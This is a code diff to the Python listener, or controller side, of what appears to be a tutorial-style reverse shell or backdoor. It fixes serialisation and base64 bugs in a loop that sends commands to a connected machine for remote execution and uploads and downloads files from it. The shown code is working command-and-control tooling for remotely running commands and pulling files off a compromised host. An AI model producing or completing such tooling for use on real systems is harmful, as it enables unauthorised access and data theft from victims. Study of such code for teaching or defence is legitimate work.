@@ -13,7 +13,7 @@ class Listener:
         print("[+] Get a connection from " + str(address))
 
     def reliable_send(self, data):
-        json_data = json.dump(data)
+        json_data = json.dumps(data)
         self.connection.send(json_data)
 
     def reliable_receive(self):
@@ -30,7 +30,7 @@ class Listener:
         if command[0] == "exit":
             self.connection.close()
             exit()
-        return self.reliable_receive(1024)
+        return self.reliable_receive()
 
     def read_file(self, path):
         with open(path, "rb") as f:
@@ -38,22 +38,23 @@ class Listener:
     
     def write_file(self, path, content):
         with open(path, "wb") as f:
-            f.write(base64.b85decode(content))
+            f.write(base64.b64decode(content))
             return "[+] Download successfull."
 
     def run(self):
         while True:
             command = raw_input(">> ")
+            # command = input(">> ") python3
             command = command.split(" ")
-            try:
-                if command[0] == "upload":
-                    file_content = self.read_file(command[1])
-                    command.append(file_content)
-                result = self.execute_remotely(command)
-                if command[0] == "download" and "[-] Error" not in result:
-                    result = self.write_file(command[1], result)
-            except Exception:
-                result = "[-] Error during command execution."
+            # try:
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+            result = self.execute_remotely(command)
+            if command[0] == "download" and "[-] Error" not in result:
+                result = self.write_file(command[1], result)
+            # except Exception:
+            #     result = "[-] Error during command execution."
 
             print(result)
 
